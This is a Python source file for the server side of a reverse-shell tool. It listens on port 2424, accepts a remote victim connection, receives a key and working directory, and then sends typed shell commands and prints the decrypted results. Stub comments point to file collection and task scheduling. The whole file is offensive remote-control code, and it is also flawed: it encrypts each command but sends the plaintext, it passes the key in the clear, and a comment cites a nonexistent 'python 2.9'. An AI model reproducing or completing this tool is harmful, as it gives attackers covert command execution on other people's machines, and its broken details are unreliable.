import socket
import reverse_shell.Reverse_Shell.cryptofernet as crypt
#have python 2.9
__ENCODING__ = 'utf-8'
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 2424
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
print("start")
s.listen(5)

# accept any connections attempted
(client_socket, client_address) = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# receiving the current working directory of the client
__CLEF__ = client_socket.recv(BUFFER_SIZE).decode(encoding=__ENCODING__)
working_directory = crypt.decrypt_str(__CLEF__, client_socket.recv(BUFFER_SIZE)).decode()
print("[+] Current working directory:", working_directory)

while True:
    # get the command from prompt

    command = input(f"{working_directory} $> ")
    command_encrypt = crypt.encrypt_str(__CLEF__, command)
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()

    output = crypt.decrypt_str(__CLEF__, output)
    # split command output and current directory
    try:
        results, cwd = output.split(bytes(SEPARATOR,encoding="utf-8"))
        results = str(results.decode(encoding=__ENCODING__))
    except:
        results = output
    if __debug__ :
        print('results', results)
    results = results.replace("\\\\", "\\")
    # print output
    print(results)
    # write to file

    #analyse file

    #schedule client task
